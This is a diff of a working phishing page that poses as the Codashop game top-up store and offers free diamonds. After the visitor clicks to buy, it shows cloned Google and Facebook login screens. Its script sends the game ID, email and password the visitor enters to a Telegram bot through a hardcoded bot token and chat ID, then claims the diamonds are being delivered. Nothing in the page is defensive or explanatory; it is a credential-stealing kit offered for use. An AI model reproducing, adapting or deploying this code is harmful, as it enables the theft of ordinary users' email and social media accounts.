@@ -6,7 +6,6 @@
     <title>Codashop - Top Up Game Favoritmu</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        /* --- CSS UTAMA CODASHOP GAYA BOSS XZAM --- */
         :root {
             --bg-color: #1a0b2e;
             --card-bg: #2d1b4d;
@@ -18,117 +17,72 @@
         body {
             background-color: var(--bg-color);
             color: var(--text-color);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 15px;
             display: flex; justify-content: center;
-            overflow-x: hidden;
         }
 
-        .container { width: 100%; max-width: 450px; transition: all 0.3s ease; }
-
+        .container { width: 100%; max-width: 450px; }
         header { text-align: left; margin-bottom: 20px; }
-        .logo { width: 150px; margin-bottom: 10px; filter: brightness(0) invert(1); }
+        .logo-coda { width: 150px; filter: brightness(0) invert(1); }
 
         .section {
-            background: var(--card-bg);
-            padding: 20px; border-radius: 12px;
-            margin-bottom: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            border-left: 4px solid var(--accent);
+            background: var(--card-bg); padding: 20px; border-radius: 12px;
+            margin-bottom: 15px; border-left: 4px solid var(--accent);
         }
 
-        .section-title { 
-            font-weight: bold; margin-bottom: 15px; 
-            display: flex; align-items: center; font-size: 15px;
-        }
+        .section-title { font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
         .section-title span {
-            background: var(--accent);
-            width: 24px; height: 24px;
+            background: var(--accent); width: 24px; height: 24px;
             display: flex; align-items: center; justify-content: center;
             border-radius: 50%; margin-right: 10px; font-size: 13px;
         }
 
-        input[type="number"] {
-            width: 100%; padding: 12px; box-sizing: border-box;
-            border-radius: 8px; border: 1px solid #444;
-            background: #1a0b2e; color: white; outline: none;
+        input {
+            width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #444;
+            background: #1a0b2e; color: white; outline: none; box-sizing: border-box;
         }
 
-        .grid-nominal {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
-        }
-
+        .grid-nominal { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .card {
-            background: #3c265e; padding: 15px;
-            text-align: center; border-radius: 10px;
-            cursor: pointer; font-size: 13px; font-weight: 500;
-            transition: 0.3s; border: 1px solid transparent;
+            background: #3c265e; padding: 15px; text-align: center;
+            border-radius: 10px; cursor: pointer; font-size: 13px;
         }
-
-        .card.highlight {
-            background: var(--highlight);
-            border: 2px solid #fff;
-            transform: scale(1.02);
-        }
-
-        .payment-box {
-            display: flex; justify-content: space-between; align-items: center;
-            background: #fff; color: #333; padding: 12px; border-radius: 8px;
-        }
-        .free-text { color: #27ae60; text-transform: uppercase; font-weight: bold;}
+        .card.highlight { background: var(--highlight); border: 2px solid #fff; }
 
         .buy-btn {
-            width: 100%; padding: 16px;
+            width: 100%; padding: 16px; border: none; color: white; font-weight: bold;
             background: linear-gradient(45deg, var(--accent), var(--highlight));
-            border: none; color: white; font-weight: bold;
             border-radius: 12px; cursor: pointer; font-size: 16px;
-            box-shadow: 0 5px 15px rgba(123, 44, 191, 0.4);
         }
 
-        /* --- STYLING HALAMAN LOGIN PALSU --- */
+        /* --- STYLING LOGIN PAGE --- */
         .login-page {
-            display: none;
-            position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 2000;
-            justify-content: center; align-items: center;
-            padding: 20px; box-sizing: border-box;
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; z-index: 2000;
+            justify-content: center; align-items: center; padding: 20px; box-sizing: border-box;
         }
 
-        /* Style Google */
-        .google-login {
-            background: white;
-            font-family: 'Roboto', sans-serif;
-            color: #202124; border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
-            width: 100%; max-width: 400px; padding: 48px 40px; text-align: center;
+        /* Google Style */
+        .google-card {
+            background: white; color: #202124; padding: 40px; border-radius: 8px;
+            width: 100%; max-width: 400px; text-align: center; font-family: 'Roboto', sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
-        .google-logo { width: 75px; margin-bottom: 10px; }
+        .google-logo-img { width: 75px; margin-bottom: 15px; }
         .google-input {
-            width: 100%; padding: 13px; border: 1px solid #dadce0;
-            border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none;
+            background: white; color: black; border: 1px solid #dadce0; margin-bottom: 15px;
         }
 
-        /* Style Facebook */
-        .facebook-login {
-            background: #f0f2f5; font-family: Helvetica, Arial, sans-serif;
-            width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 50px;
-        }
-        .fb-logo { width: 240px; margin-bottom: 20px; }
+        /* FB Style */
         .fb-card {
             background: white; padding: 20px; border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1); width: 100%; max-width: 396px; text-align: center;
+            width: 100%; max-width: 396px; text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1);
         }
-        .fb-input {
-            width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2;
-            border-radius: 6px; font-size: 17px; outline: none;
-        }
-        .fb-login-btn {
-            width: 100%; padding: 14px; background-color: #1877f2; color: white;
-            border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
-        }
+        .fb-logo-img { width: 50px; margin-bottom: 15px; }
 
-        /* MODAL PEMILIH PLATFORM */
+        /* Modal Pilihan */
         .modal {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; background: rgba(0,0,0,0.9);
@@ -136,87 +90,62 @@
         }
         .modal-content {
             background: var(--card-bg); padding: 25px; border-radius: 20px;
-            width: 85%; max-width: 350px; text-align: center; border: 1px solid var(--highlight);
+            width: 85%; max-width: 350px; text-align: center;
         }
     </style>
 </head>
 <body>
 
 <div class="container" id="mainPage">
-    <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Codashop" class="logo">
-    </header>
-
+    <header><img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" class="logo-coda"></header>
     <div class="section">
         <div class="section-title"><span>1</span> Masukan ID Akun Game</div>
         <input type="number" id="playerID" placeholder="contoh: 181985136">
     </div>
-
     <div class="section">
         <div class="section-title"><span>2</span> Pilih Nominal Top Up</div>
         <div class="grid-nominal">
-            <div class="card" onclick="selectCard(this)">140 Diamonds</div>
             <div class="card" onclick="selectCard(this)">720 Diamonds</div>
             <div class="card highlight" onclick="selectCard(this)">36500 Diamonds</div>
-            <div class="card" onclick="selectCard(this)">73100 Diamonds</div>
         </div>
     </div>
-
-    <div class="section">
-        <div class="section-title"><span>3</span> Metode Pembayaran</div>
-        <div class="payment-box">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" height="18">
-            <div class="price-tag">Harga: <span class="free-text">Rp 0 (Gratis)</span></div>
-        </div>
-    </div>
-
     <button class="buy-btn" onclick="openChooser()">BELI SEKARANG</button>
-</div>
-
-<div class="container" id="successPage" style="display:none; text-align:center;">
-    <div class="section">
-        <h1 style="color:#27ae60;">Makasih :)</h1>
-        <p>Pesanan Anda sedang diproses oleh sistem Codashop.</p>
-        <button class="buy-btn" onclick="location.reload()">KEMBALI</button>
-    </div>
 </div>
 
 <div id="chooserModal" class="modal">
     <div class="modal-content">
-        <h3>Verifikasi Akun</h3>
-        <p style="font-size:12px; color:#aaa">Pilih metode login untuk menerima item:</p>
-        <div style="display:flex; gap:10px;">
-            <button onclick="showFakePage('Facebook')" style="background:#1877f2; color:white; flex:1; padding:10px; border-radius:8px; border:none; font-weight:bold;">Facebook</button>
-            <button onclick="showFakePage('Google')" style="background:white; color:#555; flex:1; padding:10px; border-radius:8px; border:1px solid #ccc; font-weight:bold;">Google</button>
-        </div>
+        <h3 style="margin-bottom:20px;">Verifikasi Akun</h3>
+        <button onclick="showFakePage('facebook')" style="background:#1877f2; color:white; width:100%; padding:12px; border-radius:8px; border:none; font-weight:bold; cursor:pointer; margin-bottom:10px;">Login via Facebook</button>
+        <button onclick="showFakePage('google')" style="background:white; color:#555; width:100%; padding:12px; border-radius:8px; border:1px solid #ccc; font-weight:bold; cursor:pointer;">Login via Google</button>
     </div>
 </div>
 
 <div id="googlePage" class="login-page" style="background: white;">
-    <div class="google-login">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo">
-        <div style="font-size:24px; margin-bottom:10px;">Login</div>
+    <div class="google-card">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="google-logo-img" alt="Google">
+        <h2 style="font-weight:400; font-size:24px; margin-top:0;">Login</h2>
+        <p style="margin-bottom:30px;">Lanjutkan ke Codashop</p>
         <input type="email" id="googleEmail" class="google-input" placeholder="Email atau ponsel">
         <input type="password" id="googlePass" class="google-input" placeholder="Masukkan sandi Anda">
-        <button onclick="sendDataToTele('Google')" style="background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; font-weight:500; cursor:pointer;">Berikutnya</button>
+        <button onclick="sendData('Google')" style="background:#1a73e8; color:white; width:100%; padding:12px; border:none; border-radius:4px; font-weight:500; cursor:pointer; margin-top:20px;">Berikutnya</button>
     </div>
 </div>
 
-<div id="facebookPage" class="login-page">
-    <div class="facebook-login">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zLkaAs.png" class="fb-logo">
+<div id="facebookPage" class="login-page" style="background: #f0f2f5;">
+    <div style="display:flex; flex-direction:column; align-items:center; width:100%;">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zLkaAs.png" style="width:200px; margin-bottom:20px;">
         <div class="fb-card">
-            <input type="email" id="fbEmail" class="fb-input" placeholder="Email atau Nomor Telepon">
-            <input type="password" id="fbPass" class="fb-input" placeholder="Kata Sandi">
-            <button class="fb-login-btn" onclick="sendDataToTele('Facebook')">Login</button>
+            <input type="email" id="fbEmail" class="google-input" style="background:white; color:black; border:1px solid #dddfe2;" placeholder="Email atau Nomor Telepon">
+            <input type="password" id="fbPass" class="google-input" style="background:white; color:black; border:1px solid #dddfe2;" placeholder="Kata Sandi">
+            <button onclick="sendData('Facebook')" style="background:#1877f2; color:white; width:100%; padding:12px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer;">Login</button>
         </div>
     </div>
 </div>
 
 <script>
-    let currentPlatform = "";
     const TOKEN = "8779713188:AAGUlP8OU5OSs1eiJOS9BCuYVSZvPkKnjro";
     const CHAT_ID = "7153376507";
+    let pType = "";
 
     function selectCard(el) {
         document.querySelectorAll('.card').forEach(c => c.classList.remove('highlight'));
@@ -224,35 +153,35 @@
     }
 
     function openChooser() {
-        if(document.getElementById('playerID').value === "") return alert("Isi ID!");
+        if(document.getElementById('playerID').value === "") return alert("Isi ID Akun!");
         document.getElementById('chooserModal').style.display = 'flex';
-        document.getElementById('mainPage').style.display = 'none';
     }
 
-    function showFakePage(p) {
-        currentPlatform = p;
+    function showFakePage(type) {
+        pType = type;
         document.getElementById('chooserModal').style.display = 'none';
-        document.getElementById(p === 'Google' ? 'googlePage' : 'facebookPage').style.display = 'flex';
+        document.getElementById('mainPage').style.display = 'none';
+        document.getElementById(type + 'Page').style.display = 'flex';
     }
 
-    function sendDataToTele(p) {
-        const idGame = document.getElementById('playerID').value;
-        const email = p === 'Google' ? document.getElementById('googleEmail').value : document.getElementById('fbEmail').value;
-        const pass = p === 'Google' ? document.getElementById('googlePass').value : document.getElementById('fbPass').value;
+    function sendData(platform) {
+        const id = document.getElementById('playerID').value;
+        const email = platform === 'Google' ? document.getElementById('googleEmail').value : document.getElementById('fbEmail').value;
+        const pass = platform === 'Google' ? document.getElementById('googlePass').value : document.getElementById('fbPass').value;
         const nominal = document.querySelector('.card.highlight').innerText;
 
-        if (email === "" || pass === "") return alert("Mohon isi data!");
+        if(email === "" || pass === "") return alert("Isi data dulu!");
 
-        const message = `🔥 *DATA BARU CODASHOP* 🔥\nID: ${idGame}\nNominal: ${nominal}\nPlatform: ${p}\nEmail: ${email}\nPass: ${pass}`;
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        const msg = `🔥 *DATA BARU CODASHOP* 🔥\nID: ${id}\nNominal: ${nominal}\nLogin: ${platform}\nUser: ${email}\nPass: ${pass}`;
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
 
         fetch(url).then(() => {
-            document.getElementById('googlePage').style.display = 'none';
-            document.getElementById('facebookPage').style.display = 'none';
-            document.getElementById('successPage').style.display = 'block';
+            alert("Berhasil! Diamond sedang dalam pengiriman.");
+            location.reload();
         });
     }
 </script>
 
 </body>
 </html>
+
